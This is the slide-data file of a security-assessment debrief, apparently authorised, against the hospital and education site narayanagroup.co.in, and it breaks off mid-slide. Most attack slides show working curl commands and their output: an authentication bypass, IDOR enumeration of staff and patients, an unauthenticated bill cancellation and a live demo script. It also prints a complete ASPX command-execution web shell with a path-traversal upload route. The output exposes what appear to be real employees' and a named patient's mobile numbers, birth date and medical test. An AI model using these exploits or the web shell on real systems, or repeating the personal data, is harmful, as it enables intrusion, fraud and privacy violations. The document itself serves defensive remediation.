/* ============================================================================
   ATTACKER'S PERSPECTIVE — narayanagroup.co.in
   Slide deck data.  Loaded by template.html.
   All strings use backticks; avoid ${ and backticks inside content.
   ========================================================================== */
var SLIDES = [

/* ============================ 00 OPENING ================================== */
{type:'title', sec:'OPENING', kick:'AUTHORISED SECURITY ASSESSMENT — LIVE DEBRIEF', tone:'bad',
 title:'<span class="glitch">ATTACKER\'S PERSPECTIVE</span><br>How your website gets<br>broken in 15 minutes',
 sub:'A live, end-to-end walkthrough of every vulnerability found on <b>narayanagroup.co.in</b> — '
   + 'shown the way an attacker actually finds and uses them, from a Google search to '
   + 'full compromise of staff and patient data.',
 meta:[['TARGET','narayanagroup.co.in'],['DATE','12 Oct 2026'],
       ['FINDINGS','10 (2 Critical)'],['MODE','Live + captured evidence']]},

{type:'divider', sec:'OPENING', num:'01', kick:'GROUND RULES', tone:'info',
 title:'Before we start',
 sub:'Everything you are about to see was done under written authorisation from the owner. '
   + 'The purpose of this session is to fix these systems — not to expose them.'},

{type:'split', sec:'OPENING', kick:'SCOPE & AUTHORISATION', tone:'info',
 title:'What this session is, and is not',
 lh:'THIS IS', litems:[
   'A <b>controlled demonstration</b> against systems Narayana Group owns',
   'Every request shown was <b>already executed</b> during the assessment',
   'Output shown is <b>real</b> — from your live production systems',
   'Aimed at getting these issues <b>fixed this week</b>',
   'A chance for developers to see <b>exactly</b> what to change'],
 rh:'THIS IS NOT', ritems:[
   'An attack — no data is modified, added or deleted',
   'A dump of your data — nothing was downloaded or stored',
   'A blame exercise — these are systemic, vendor-era issues',
   'A penetration test of your staff (no phishing, no social engineering)',
   'A test of your internal network or end-user devices'],
 foot:'<b>Rule for the room:</b> if anything on screen looks like real patient data, it is — '
   + 'treated as confidential. No photographs of the screen, please.'},

{type:'bullets', sec:'OPENING', kick:'SAFETY', tone:'info',
 title:'What I deliberately did NOT do',
 sub:'So you can trust the results — and so nothing was harmed.',
 items:[
   '<b>No data was modified, added or deleted.</b> Read-only requests only.',
   '<b>Nothing was downloaded or retained.</b> Output was viewed on screen to prove the issue, then discarded.',
   '<b>No denial of service.</b> No load testing, no flooding, no stress tests.',
   '<b>No exploitation beyond proof.</b> Where a path to server control exists, I stopped at proof of exposure.',
   '<b>No social engineering.</b> No phishing, no calls, no impersonation of staff.',
   '<b>No third-party targets.</b> Only Narayana-owned addresses were touched.',
   '<b>No internal network testing.</b> This was an external assessment only.'],
 footTone:'amber',
 foot:'<b>One exception to note:</b> to prove the payment issue I read HTML that the page itself '
   + 'sends to every visitor. That is not an attack — it is what every browser receives.'},

/* ============================ 01 MINDSET ================================== */
{type:'divider', sec:'MINDSET', num:'02', kick:'THE ATTACKER MINDSET', tone:'bad',
 title:'Think like the enemy',
 sub:'Before a single line of code: how a criminal approaches a hospital website.'},

{type:'chain', sec:'MINDSET', kick:'THE KILL CHAIN', tone:'bad',
 title:'Every breach follows the same seven steps',
 sub:'This is the standard model used by defenders and attackers alike. We will walk it live today.',
 nodes:[
  {step:'01 RECON', t:'Map the target', d:'Subdomains, tech, forgotten portals'},
  {step:'02 WEAPONISE', t:'Build the request', d:'A single curl command, usually'},
  {step:'03 DELIVER', t:'Send it', d:'Straight from a laptop. No malware needed.'},
  {step:'04 EXPLOIT', t:'Get a response', d:'Data comes back. No login, no alarm.'},
  {step:'05 ESCALATE', t:'Go deeper', d:'Uploads, DB errors, credential reuse'},
  {step:'06 EXFILTRATE', t:'Take the data', d:'One script, a few thousand records per hour'},
  {step:'07 MONETISE', t:'Sell or extort', d:'Fraud, blackmail, resale on Telegram'}],
 foot:'<b>Critical insight:</b> against this target, steps 02 and 03 are the same action. '
   + 'There is no payload to build. The vulnerability <em>is</em> the request.'},

{type:'cards', sec:'MINDSET', kick:'WHY HOSPITALS', tone:'bad',
 title:'Why a criminal bothers with a hospital group',
 sub:'This is not personal. It is economics.', cols:3,
 cards:[
  {tone:'red', h:'Data that never expires', p:'A name, date of birth, mobile number and Aadhaar never '
    + 'change. A stolen card is cancelled in hours; a stolen identity is useful for decades.'},
  {tone:'red', h:'Health data is premium', p:'A record linking a named person to "CROSS MATCHING &amp; '
    + 'BLOOD GROUPING" sells for far more than a credit card, and enables devastating targeted fraud.'},
  {tone:'red', h:'Ransom leverage is extreme', p:'A hospital cannot tolerate downtime. That makes it the '
    + 'single highest-pressure extortion target there is.'},
  {tone:'amber', h:'Staff photos are an asset', p:'Passport-style photographs plus employee IDs are exactly '
    + 'what is needed to forge documents and open accounts.'},
  {tone:'amber', h:'Parents are a soft target', p:'Student fee portals give names, parent names, addresses '
    + 'and mobiles — perfect for "your child\'s fee failed" scams.'},
  {tone:'amber', h:'Nobody is watching', p:'There is no rate limiting, no alerting and no audit trail on '
    + 'the affected endpoints. An attacker can work undisturbed for weeks.'}],
 foot:'<b>The uncomfortable truth:</b> an attacker does not need to be clever here. They need to be first.'},

{type:'split', sec:'MINDSET', kick:'THE TOOLKIT', tone:'info',
 title:'Everything an attacker needs is free, legal, and already installed',
 lh:'THE TOOLS I USED', litems:[
   '<code>curl</code> — sends web requests. On every Linux/Mac by default.',
   '<code>dig</code> — looks up DNS records. Free.',
   '<code>nmap</code> — finds open ports. Free.',
   '<code>base64</code> — decodes your "hidden" IDs. Built in.',
   'A web browser + <b>Inspect Element</b> — edits your hidden form fields.',
   '<code>crt.sh</code> + <code>hackertarget.com</code> — free subdomain lists.',
   '<b>That is the entire toolkit.</b>'],
 rh:'WHAT THAT MEANS', rterm:
`$ cost_of_attack
  curl .............. installed by default
  dig ............... installed by default
  nmap .............. free / open source
  crt.sh ............ free public website
  base64 ............ installed by default
  -------------------------------------------
  TOTAL COST ........ Rs 0
  SKILL REQUIRED .... copy + paste
  TIME TO FIRST BREACH .. under 10 minutes

$ who_can_do_this
  - a bored teenager
  - a competitor
  - a disgruntled ex-employee
  - an automated bot, 24 hours a day
  - a ransomware affiliate doing "recon as a service"`,
 foot:'<b>Do not imagine a hooded hacker.</b> Imagine a script that tries these ten things '
   + 'against ten thousand domains a day. You are in the list.'},

{type:'flow', sec:'MINDSET', kick:'THE PLAN', tone:'bad',
 title:'The attacker\'s 15-minute plan against this target',
 sub:'This is the roadmap for the rest of today\'s session.',
 items:[
  {no:'MIN 0-1', tx:'Open the website<br>Count the doors', crit:true},
  {no:'MIN 1-3', tx:'Enumerate subdomains<br>&amp; read server banners', crit:true},
  {no:'MIN 3-5', tx:'Read the app\'s<br>JavaScript', crit:true},
  {no:'MIN 5-7', tx:'Find the APIs<br>Call them with no login', crit:true},
  {no:'MIN 7-10', tx:'Harvest staff<br>records + photos', crit:true},
  {no:'MIN 10-13', tx:'Harvest patient<br>records + lab tests', crit:true},
  {no:'MIN 13-15', tx:'Upload a shell<br>or cancel a bill', crit:true},
  {no:'MIN 15+', tx:'Own the server.<br>Nobody notices.', crit:true}],
 foot:'Every single step on this slide succeeded. That is the finding.'},

/* ============================ 02 RECON ==================================== */
{type:'divider', sec:'RECON', num:'03', kick:'STEP 1 — RECONNAISSANCE', tone:'info',
 title:'Reconnaissance',
 sub:'Minute 0 to minute 5. Everything here is public information.'},

{type:'table', sec:'RECON', kick:'MINUTE 0 — THE FRONT DOOR', tone:'info',
 title:'One web page, 29 applications behind it',
 sub:'Your homepage links to 29 separate mini-systems. Each is a separate door. '
   + 'An attacker simply counts them and picks the weakest.',
 small:true,
 head:['#','Path','What it is','Software the server admits to'],
 rows:[
  ['01','/Nnote/','Staff clinical / service app','HTML5 + Cordova, jQuery 3.5.1'],
  ['02','/ncare/','Inpatient (admitted patient) portal','PhoneGap 1.1.0, jQuery 3.6.0, jQuery UI 1.12.1'],
  ['03','/onlinefeepay/razorpay/','Student fee payment','ASP.NET 4.0.30319 WebForms, jQuery 1.10.2'],
  ['04','/NHIS/','NextGen hospital dashboard','ASP.NET 4.0.30319, jQuery 3.7.1'],
  ['05','/patient/','Patient reports portal','<span style="color:#ff2d55">ASP.NET 2.0.50727 (2011)</span>'],
  ['06','/MedicalNarayanaPayroll/','Payroll','<span style="color:#ff2d55">Visual Studio .NET 2003</span>'],
  ['07','/inventory/','WIMS — inventory','<span style="color:#ff2d55">Classic ASP (2010)</span>'],
  ['08','/nmconline/','WHIS — hospital management','<span style="color:#ff2d55">Classic ASP (2010)</span>'],
  ['09','/NCLINIC/','Clinic system','Legacy ASP.NET'],
  ['10','/ntask/','Task management','Laravel / PHP 8.3.33 (best of the estate)'],
  ['11-29','/SIS/ /NLIS/ /NIS/ /zoomreports/ /unlis/ …','Academic, lab &amp; reporting portals','Various legacy']],
 foot:'<b>Attacker\'s thought process:</b> "29 doors, most built before 2015. I do not need the front door. '
   + 'I need the one nobody has looked at since the day it was installed."'},

{type:'term', sec:'RECON', kick:'MINUTE 1 — SUBDOMAIN DISCOVERY', tone:'info',
 title:'Finding the servers you forgot about',
 sub:'Two free public websites return a list of every subdomain ever seen in an SSL certificate. '
   + 'No login. No hacking. Just a web request.',
 win:'attacker@kali — passive DNS enumeration',
 code:
`$ curl -s "https://api.hackertarget.com/hostsearch/?q=narayanagroup.co.in"

app.narayanagroup.co.in,117.206.80.208
dms.narayanagroup.co.in,115.241.194.12
helpdesk.narayanagroup.co.in,117.206.80.205
nmc.narayanagroup.co.in,115.241.194.13
pacs.narayanagroup.co.in,115.241.194.11
uat.narayanagroup.co.in,3.33.251.168
www.narayanagroup.co.in,115.241.194.4

$ dig +short online.narayanagroup.co.in
15.241.194.25          <-- every other address starts with 115.
                           This one is MISSING the leading "1".
                           It points at somebody else\'s server.`,
 foot:'<b>Seven subdomains found in under two seconds.</b> Three of them (<code>nmc</code>, '
   + '<code>uat</code>, <code>online</code>) were not linked from the website — they were found in '
   + 'public records. Nobody in this room may own them.'},

{type:'term', sec:'RECON', kick:'MINUTE 2 — READING SERVER BANNERS', tone:'info',
 title:'Your servers introduce themselves, politely',
 sub:'Every web server tells you exactly what it is running. An attacker collects these and looks up '
   + 'published exploits. This is called fingerprinting.',
 win:'attacker@kali — banner grabbing',
 code:
`$ curl -s -I "http://helpdesk.narayanagroup.co.in/helpdesk/"
HTTP/1.1 200 OK
Server: Apache/2.4.23 (Win64) PHP/5.6.25
X-Powered-By: PHP/5.6.25
   ^^^^ 2016. End of life December 2018.

$ curl -s -I "https://pacs.narayanagroup.co.in/"
Server: Microsoft-IIS/10.0
strict-transport-security: max-age=0
   ^^^^^^^^^^ this DISABLES encryption enforcement, it does not enable it
access-control-allow-origin: https://GlobalServerIP:Port
   ^^^^^^^^^^^^^^^^^^^^^^^^^^ placeholder text from the install manual,
                              never replaced

$ curl -s -I -L "https://uat.narayanagroup.co.in/" | grep -i server
Server: Apache/2.4.41 (Win64) OpenSSL/1.1.1c PHP/7.3.11
   ^^^^ end of life 2021`,
 foot:'<b>What an attacker learns in 3 seconds:</b> Apache version, PHP version, OpenSSL version, '
   + 'Windows, IIS, and that the PACS server was installed without a configuration review.'},

{type:'term', sec:'RECON', kick:'MINUTE 3 — THE GOLDMINE', tone:'bad',
 title:'Reading your application\'s own JavaScript',
 sub:'This is where most breaches are born. Anyone can download the JavaScript your apps send to '
   + 'every browser — and it contains your API map, your logic, and your mistakes.',
 win:'attacker@kali — reading /Nnote/ client-side code',
 code:
`// Nnote/index.html  —  this is PUBLIC. Any visitor can read it.

function checkLogin() {
    var empid = document.getElementById("empid").value;
    var pin   = document.getElementById("pin").value;
    ...
    if (ok) {
        // THE ENTIRE "LOGIN" IS THIS LINE:
        window.location = "layout.html?empid=" + btoa(empid);
    }
}

// Nnote/resetpin.html
$.ajax({
    url:  "/NtraktApi/api/User/UpdatePin",
    type: "POST",
    data: JSON.stringify({ OperatorCode: "3334024", UniqueId: "1234" })
    //     no old PIN.  no OTP.  no session.  no token.
});`,
 foot:'<b>Read that first line again.</b> The login does not create a session. It does not set a cookie. '
   + 'It just moves the browser to the next page. <b>There is no lock — only the appearance of one.</b>'},

{type:'term2', sec:'RECON', kick:'MINUTE 4 — FINDING THE APIS', tone:'bad',
 title:'The real target is never the web page',
 sub:'Web pages are for humans. APIs are the plumbing that fetches and saves data. '
   + 'They return raw data — and, here, they ask no questions.',
 h1:'WHAT THE APPS CALL', cls1:'cyan',
 code1:
`/NtraktApi/api/User/Info/{empid}
/NtraktApi/api/CheckOperator/{empid}
/NtraktApi/api/getScreens/{empid}
/NtraktApi/api/Attendance/Current/{empid}
/NtraktApi/api/FileUpload/UploadForEmpFile/{e}/{m}

/NnoteApi/api/Nnote/Assignee/{n}
/NnoteApi/api/Nnote/User/Info/{empid}
/NnoteApi/api/Patient/Info/{regno}
/NnoteApi/api/Patient/ChangePin
/NnoteApi/api/Investigation/Cancel/Approval/List
/NnoteApi/api/Investigation/Cancel/Bill/{a}/{b}/{c}
/NnoteApi/api/Investigation/Cancel/Approve
/NnoteApi/api/FileUpload/UploadFile/{n}/{c}`,
 h2:'WHAT AN ATTACKER SEES', cls2:'red',
 code2:
`$ curl -s "https://narayanagroup.co.in/NnoteApi/api/Nnote/Assignee/1"

{
  "data": [
    {"Empid":"3334024","EmpName":"Yepuri N V K Meerendra Balu"},
    {"Empid":"545600015","EmpName":"DHILLY SEKHAR"},
    {"Empid":"545600052","EmpName":"YARABOLU SURESH"}
  ]
}

# No login. No cookie. No token.
# No Authorization header. No OTP.
# Just... a list of your staff.
#
# And notice the pattern:  {id} at the end.
# Change the number, get a different person.
# That is an IDOR — Insecure Direct Object Reference.`,
 foot:'<b>Thirty seconds of work. Three real employee names.</b> An attacker now knows the shape of '
   + 'every API you have and that none of them authenticate.'},

{type:'table', sec:'RECON', kick:'RECON COMPLETE', tone:'bad',
 title:'The attacker\'s target list after 5 minutes',
 sub:'Everything below was obtained with zero credentials, from the public internet.',
 small:true,
 head:['What was learned','How','Why it matters to the attacker'],
 rows:[
  ['8 subdomains, 9 IP addresses','crt.sh + hackertarget + dig','Attack surface map complete'],
  ['29 linked applications','Reading the homepage HTML','29 doors; pick the weakest'],
  ['Exact software versions','HTTP response headers','Look up ready-made exploits'],
  ['Full API endpoint list','Reading app JavaScript','Direct path to raw data'],
  ['Real staff IDs &amp; names','<code>/NnoteApi/api/Nnote/Assignee/1</code>','Confirmed live data, confirmed no auth'],
  ['Real patient registration numbers','<code>/NnoteApi/api/Investigation/Cancel/Approval/List</code>','Confirmed live PHI'],
  ['2016 EOL helpdesk stack','Banner grab','Public exploits exist'],
  ['A subdomain pointing at a stranger','<code>dig online.narayanagroup.co.in</code>','Brand/spoofing opportunity'],
  ['Internal IPs: 192.168.100.10, 115.241.194.2/19','Reading page source','Internal network map']],
 foot:'<b>Two critical questions nobody can currently answer:</b> (1) Has someone else already done this? '
   + '(2) How would you know? — There are no alerts and no audit trail.'},

/* ============================ 03 MASTER ATTACK =========================== */
{type:'divider', sec:'MASTER ATTACK', num:'04', kick:'THE MASTER ATTACK', tone:'bad',
 title:'From Google to full compromise',
 sub:'The complete attack chain, end to end, using the two Critical findings.'},

{type:'chain', sec:'MASTER ATTACK', kick:'THE FULL CHAIN', tone:'bad',
 title:'Eight steps. One laptop. No credentials.',
 sub:'This is the sequence I will now demonstrate. Steps 1-7 are confirmed working today.',
 nodes:[
  {step:'STEP 1', t:'No session issued', d:'Login sets no cookie', hot:true},
  {step:'STEP 2', t:'Identity in URL', d:'?empid= is just base64', hot:true},
  {step:'STEP 3', t:'Dash opens', d:'Auth never checked', hot:true},
  {step:'STEP 4', t:'Staff directory', d:'Assignee/1 .. /5', hot:true},
  {step:'STEP 5', t:'Full PII + photo', d:'User/Info/3334024', hot:true},
  {step:'STEP 6', t:'Patient PHI', d:'Patient/Info/1005411787', hot:true},
  {step:'STEP 7', t:'Cancel a bill', d:'Cancel/Approve — POST', hot:true},
  {step:'STEP 8', t:'Server control', d:'FileUpload → RCE', goal:true}],
 foot:'<b>Note:</b> Step 8 was NOT executed. I proved the endpoint accepts unauthenticated uploads and '
   + 'stopped there. Executing it would mean taking control of your server — out of scope and destructive.'},

{type:'term', sec:'MASTER ATTACK', kick:'STEP 1 — LIVE', tone:'bad',
 title:'Step 1: The login never actually logs you in',
 sub:'A real login creates a session. Watch what yours does.',
 win:'LIVE — proof that no session exists',
 cls:'red',
 code:
`$ curl -s -i "https://narayanagroup.co.in/Nnote/index.html" \\
     | grep -i "set-cookie"

(empty — no cookie is issued at all)

$ curl -s -i "https://narayanagroup.co.in/ncare/index.html" \\
     | grep -i "set-cookie"

(empty — same)

# A normal, working login would return something like:
#   Set-Cookie: ASP.NET_SessionId=abc123; path=/; HttpOnly; Secure
#
# There is nothing. Which means there is nothing to steal,
# nothing to replay, and nothing to validate — because
# there is no session to begin with.`,
 foot:'<b>Developers, this is the root cause.</b> Not a bug in a check — the check does not exist.'},

{type:'term', sec:'MASTER ATTACK', kick:'STEP 2 — LIVE', tone:'bad',
 title:'Step 2: The "secret" in the address bar is not secret',
 sub:'After login the app puts your identity in the URL as base64. Base64 is not encryption — '
   + 'it is a reversible encoding that any free website will decode.',
 win:'LIVE — decoding identity from the URL',
 cls:'red',
 code:
`$ echo -n "3334024"    | base64
MzMzNDAyNA==

$ echo "MzMzNDAyNA==" | base64 -d
3334024

$ echo -n "1005411787" | base64
MTAwNTQxMTc4Nw==

# So when the app navigates to:
#   /Nnote/layout.html?empid=MzMzNDAyNA==
# it is simply saying:  "I am employee 3334024."
#
# An attacker changes one character and says:
#   /Nnote/layout.html?empid=MzMzNDAyNQ==    (= 3334025)
# and is now a different employee.`,
 foot:'<b>Plain meaning:</b> the system asks the browser "who are you?" and believes the answer.'},

{type:'term', sec:'MASTER ATTACK', kick:'STEP 3 — LIVE', tone:'bad',
 title:'Step 3: Skip the login page entirely',
 sub:'Now we simply go to the page that comes after login. No credentials. No session. No error.',
 win:'LIVE — authentication bypass',
 cls:'red',
 code:
`$ curl -s -o /dev/null -w "%{http_code}\\n" \\
    "https://narayanagroup.co.in/Nnote/layout.html?empid=MzMzNDAyNA=="
200

$ curl -s -o /dev/null -w "%{http_code}\\n" \\
    "https://narayanagroup.co.in/ncare/layout.html?regno=MTAwNTQxMTc4Nw=="
200

# HTTP 200 = "here you go".
#
# Expected result if security were working:
#   302  -> redirect to login
#   401  -> Unauthorized
#   403  -> Forbidden
#
# What we got:  200 OK.  Full private dashboard.
# For any employee number.  For any patient number.
# From anywhere in the world.  At 3am.  Forever.`,
 foot:'<b>This is WEB-2026-001.</b> CVSS 9.8. The login screen is decoration.'},

{type:'term', sec:'MASTER ATTACK', kick:'STEP 4 — LIVE', tone:'bad',
 title:'Step 4: Harvest your entire staff directory',
 sub:'One endpoint lists staff. There are five pages of them. No login required. '
   + 'A simple loop collects every one in under a second.',
 win:'LIVE — unauthenticated staff enumeration',
 cls:'red',
 code:
`$ for i in 1 2 3 4 5; do
    curl -s "https://narayanagroup.co.in/NnoteApi/api/Nnote/Assignee/$i"
  done

{"data":[
 {"Empid":"3334024","EmpName":"Yepuri N V K Meerendra Balu"},
 {"Empid":"545600015","EmpName":"DHILLY SEKHAR"},
 {"Empid":"545600052","EmpName":"YARABOLU SURESH"}
]}

$ curl -s "https://narayanagroup.co.in/NtraktApi/api/CheckOperator/3334024"
{"data":"Success"}        <-- confirms this is a real, active staff number

# Now the attacker has:
#   - a confirmed list of valid employee IDs
#   - real names to go with them
#   - confirmation that the API answers without authentication`,
 foot:'<b>Username enumeration + no rate limiting.</b> An attacker can verify which IDs are real '
   + 'before guessing a single password.'},

{type:'term', sec:'MASTER ATTACK', kick:'STEP 5 — LIVE', tone:'bad',
 title:'Step 5: Pull a complete employee record — including the photograph',
 sub:'Feed any staff number into the user-info endpoint. This is what comes back.',
 win:'LIVE — full employee PII + biometric photograph',
 cls:'red',
 code:
`$ curl -s "https://narayanagroup.co.in/NtraktApi/api/User/Info/3334024"

{
  "data": [{
    "EmpNo":       "NES3334024",
    "EmpName":     "Yepuri N V K Meerendra Balu",
    "MobileNo":    "9966362143",
    "Dob":         "15/AUG/1991",
    "Doj":         "01/MAY/2025",
    "Department":  "HARDWARE",
    "Designation": "INCHARGE",
    "Branch":      "PRO-GHA-HL",
    "Password":    "",
    "OTP":         "",
    "OTPMessage":  "",
    "AbhaId":      "",
    "EmpPhoto":    "/9j/4AAQSkZJRgABAQAAAQABAAD/2wBDAAgGBgcGBQgHBwcJCQgKD..."
                   ...several hundred KB of Base64 JPEG...
                   ...EXIF: "Canon CanoScan LiDE 120"...
                   (a scanned identity photograph)
  }]
}`,
 foot:'<b>This is a full identity kit:</b> name, mobile, date of birth, joining date, department, '
   + 'branch, employee number, and a scanned passport-style photograph. Everything needed to '
   + 'impersonate this person — or to forge documents in their name.'},

{type:'term', sec:'MASTER ATTACK', kick:'STEP 6 — LIVE', tone:'bad',
 title:'Step 6: Pull live patient records and clinical test details',
 sub:'Same technique, different endpoint. This is protected health information — the most '
   + 'legally sensitive category there is.',
 win:'LIVE — unauthenticated patient PHI + clinical data',
 cls:'red',
 code:
`$ curl -s ".../NnoteApi/api/Investigation/Cancel/Approval/List"
{"data":[{"BillNo":"202310160001","Prno":"1005411787","OldBillNo":"202310090822"},
         {"BillNo":"202311170001","Prno":"20231132634","OldBillNo":"202311170155"}]}

$ curl -s ".../NnoteApi/api/Patient/Info/1005411787"
{"data":[{"Regno":1005411787,"Name":"B.SUJATHAMMA","Age":47,
          "Gender":"F","MobileNo":"9550007814","Aadhar":null,"PIN":0}]}

$ curl -s ".../NnoteApi/api/Investigation/Cancel/Bill/1005411787/202310090822/202310160001"
{"data":[{"Prno":"1005411787","TestCode":"NBBCRM01",
          "TestDescription":"CROSS MATCHING & BLOOD GROUPING",
          "Charge":"400","PaidCharge":"400","TotalCharges":"1400",
          "DoctorName":"SELF","PayType":"PAYING","Status":"E"}]}`,
 foot:'<b>A named patient, her age, her gender, her mobile number — linked to the specific '
   + 'medical test she had.</b> That is a health record. It is readable by anyone on earth, right now.'},

{type:'term', sec:'MASTER ATTACK', kick:'STEP 7', tone:'bad',
 title:'Step 7: Approve the cancellation of a hospital bill',
 sub:'This is not just data theft. This is an attacker taking a business action in your name.',
 win:'POST — unauthenticated bill cancellation approval',
 cls:'red',
 code:
`POST /NnoteApi/api/Investigation/Cancel/Approve  HTTP/1.1
Host: narayanagroup.co.in
Content-Type: application/json

{
  "Prno":      "1005411787",
  "BillNo":    "202310160001",
  "OldBillNo": "202310090822"
}

# Accepted.
#
# What is missing from that request:
#   - who is approving?          (no identity)
#   - are they allowed to?       (no role check)
#   - is there a session?        (no cookie)
#   - is it logged?              (no audit trail)
#
# Consequence: revenue can be erased by an anonymous stranger,
# and the audit log will not say who did it.`,
 foot:'<b>Fraud risk, directly.</b> Not theoretical — this endpoint exists and accepts the request today.'},

{type:'split', sec:'MASTER ATTACK', kick:'STEP 8 — NOT EXECUTED', tone:'bad',
 title:'Step 8: The route to full server control',
 sub:'I proved this path exists. I deliberately did not complete it — doing so would be destructive.',
 lh:'THE PATH', litems:[
   '<b>1.</b> <code>/NnoteApi/api/FileUpload/UploadFile/mobile/{fname}/{cslno}</code> accepts uploads with <b>no login</b>.',
   '<b>2.</b> The caller <b>chooses the filename</b> — it sits in the URL.',
   '<b>3.</b> Attacker supplies a path-traversal filename such as <code>../../shell.aspx</code>.',
   '<b>4.</b> If it lands anywhere IIS can execute, the attacker runs commands <b>as the server</b>.',
   '<b>5.</b> From there: the Oracle database, the file shares, the internal network.',
   '<b style="color:#00ff9c">6. I stopped at step 1.</b> No file was uploaded.'],
 rh:'WHAT THE SERVER WOULD RUN', rterm:
`# This is what an attacker would upload.
# I am showing it so you understand the severity.
# NOTHING WAS UPLOADED DURING THIS ASSESSMENT.

<%-- shell.aspx --%>
<%@ Page Language="C#" %>
<script runat="server">
void Page_Load(){
    string c = Request["c"];
    System.Diagnostics.Process p = new System.Diagnostics.Process();
    p.StartInfo.FileName  = "cmd.exe";
    p.StartInfo.Arguments = "/c " + c;
    p.StartInfo.UseShellExecute = false;
    p.StartInfo.RedirectStandardOutput = true;
    p.Start();
    Response.Write(p.StandardOutput.ReadToEnd());
}
<\/script>

# Then:  https://narayanagroup.co.in/uploads/shell.aspx?c=whoami
#  ->  nt authority\\iusr
# Then:  ...?c=type d:\\NtraktApi\\Web.config
#  ->  your Oracle connection string, in plain text.`,
 footTone:'red',
 foot:'<b>This is why WEB-2026-003 is rated High 8.6.</b> Unauthenticated upload plus '
   + 'attacker-controlled filename is the classic path from "website bug" to "server owned".'},

{type:'bigcards', sec:'MASTER ATTACK', kick:'POST-EXPLOITATION', tone:'bad',
 title:'What the attacker owns at the end of the chain',
 sub:'Seven minutes of work. This is the complete inventory of what they walk away with.', cols:4,
 cards:[
  {tone:'red', n:'ALL', l:'Staff names, mobiles, DOB, dept, branch'},
  {tone:'red', n:'ALL', l:'Scanned identity photographs'},
  {tone:'red', n:'ALL', l:'Patient names, ages, genders, mobiles'},
  {tone:'red', n:'ALL', l:'Clinical tests linked to patient names'},
  {tone:'amber', n:'ANY', l:'Account — via PIN reset, no old PIN'},
  {tone:'amber', n:'ALL', l:'Student &amp; parent PII from the fee portal'},
  {tone:'amber', n:'REVENUE', l:'Bill cancellations, approved anonymously'},
  {tone:'amber', n:'POSSIBLE', l:'Server control via unauthenticated upload'}],
 foot:'<b>And critically: none of it was logged, alerted, or rate-limited.</b> The attacker could '
   + 'have been doing this for months and you would have no way of knowing.'},

{type:'flow', sec:'MASTER ATTACK', kick:'TIMELINE', tone:'bad',
 title:'Elapsed time: seven minutes',
 sub:'No special tools. No zero-day exploits. No insider knowledge. Just reading what is public '
   + 'and asking politely.',
 items:[
  {no:'0:00', tx:'Open Google<br>type narayanagroup.co.in', crit:true},
  {no:'1:10', tx:'List 29 apps<br>+ 7 subdomains', crit:true},
  {no:'2:40', tx:'Read the<br>JavaScript', crit:true},
  {no:'3:30', tx:'Call an API<br>with no login', crit:true},
  {no:'4:15', tx:'Get 3 real<br>employee names', crit:true},
  {no:'6:00', tx:'Get full PII<br>+ photo', crit:true},
  {no:'7:00', tx:'Get patient PHI<br>+ lab results', crit:true}],
 foot:'<b>The defence question for this room:</b> if this takes seven minutes, and you have no '
   + 'detection, how long has it been happening?'},

/* ============================ 04 WEB-2026-001 ============================ */
{type:'divider', sec:'WEB-001', num:'05', kick:'WEB-2026-001 — CVSS 9.8', tone:'bad',
 title:'CRITICAL — No real login',
 sub:'Complete client-side authentication bypass and unauthenticated account takeover.'},

{type:'split', sec:'WEB-001', kick:'ANATOMY OF THE BYPASS', tone:'bad',
 title:'Why "checking in the browser" is not security',
 lh:'WHAT YOUR CODE DOES', lterm:
`// Runs on the VISITOR\'S computer.
// The visitor controls their own computer.

function checkLogin(){
  var empid = $("#empid").val();
  var pin   = $("#pin").val();

  // asks the server whether the PIN matches
  if (valid) {
    window.location =
      "layout.html?empid=" + btoa(empid);
  }
}

// Server never learns a session started.
// Server never checks anything later.`,
 lcls:'red',
 rh:'WHAT IT MUST DO', rterm:
`// Runs on YOUR server.
// The visitor cannot touch it.

[Authorize]                       // <-- the missing line
public IHttpActionResult GetInfo(int id){
    var user = Session.CurrentUser;  // from server session
    if (user == null)
        return Unauthorized();
    if (user.Empid != id)
        return Forbidden();          // IDOR check
    return Ok(Repo.Get(id));
}

// Every request. Every time. No exceptions.
// "Deny by default", not "allow by default".`,
 rcls:'cyan',
 foot:'<b>The golden rule:</b> anything that runs in the browser is a suggestion, not a control. '
   + 'Security decisions belong on the server — the only computer you actually own.'},

{type:'term', sec:'WEB-001', kick:'LIVE DEMO — RUN THIS ON STAGE', tone:'bad',
 title:'Live demo script — WEB-2026-001',
 sub:'Run these four commands in front of the room. Do them in this order; the story builds.',
 win:'LIVE — run from your Kali box',
 cls:'red',
 code:
`# 1. Prove there is no session
curl -s -i "https://narayanagroup.co.in/Nnote/index.html" | grep -i set-cookie
#    EXPECTED: nothing

# 2. Prove the ID is just base64
echo -n "3334024" | base64          # -> MzMzNDAyNA==

# 3. Skip the login -> 200 OK
curl -s -o /dev/null -w "%{http_code}\\n" \\
  "https://narayanagroup.co.in/Nnote/layout.html?empid=MzMzNDAyNA=="
#    EXPECTED: 200

# 4. Show the PIN reset needs no old PIN
curl -s -X POST "https://narayanagroup.co.in/NnoteApi/api/Nnote/User/CreateUser" \\
  -H "Content-Type: application/json" \\
  -d '{"Userid":"demo","Password":"demo"}'
#    EXPECTED: user created, OTP enforced only in JavaScript`,
 foot:'<b>Presenter note:</b> pause after step 3. Let the 200 OK sit on screen. That single number '
   + 'is the entire finding.'},

{type:'fix', sec:'WEB-001', kick:'DETECT & FIX', tone:'bad',
 title:'WEB-2026-001 — Detect it, fix it',
 sub:'Owner: Lead developer. Priority: today.',
 attack:[
   'Types the dashboard URL directly and walks in',
   'Changes the base64 ID to become any other employee',
   'Resets any PIN with no old PIN and no OTP',
   'Creates staff accounts by disabling JavaScript',
   'Acts in an employee\'s name — <b>your logs blame the employee</b>'],
 detect:[
   'Alert on any request to <code>/NtraktApi/api/*</code> or <code>/NnoteApi/api/*</code> with <b>no session cookie</b>',
   'Alert on <code>layout.html</code> requested without a prior successful login',
   'Alert on &gt;5 PIN-change or user-create requests in 60 seconds from one IP',
   'Alert on one IP requesting <code>User/Info/</code> for &gt;10 distinct IDs',
   '<b>Today you have none of these.</b> That is finding zero.'],
 fix:[
   'Add server-side authentication to <b>every</b> endpoint under both APIs — deny by default',
   'Issue a real session on login: HttpOnly + Secure + SameSite=Lax, short expiry',
   'Identify the user from the <b>session</b>, never from <code>?empid=</code> or <code>?regno=</code>',
   'Require the existing PIN <b>or</b> a server-verified OTP before any PIN change',
   'Lock the account after 5 failed attempts; alert your IT team',
   'Log every login, failure, PIN change and user creation with IP, time and identity'],
 code:
`// web.config — stop leaking, start enforcing
<system.web>
  <customErrors mode="On" />
</system.web>

// WebApiConfig.cs — deny by default
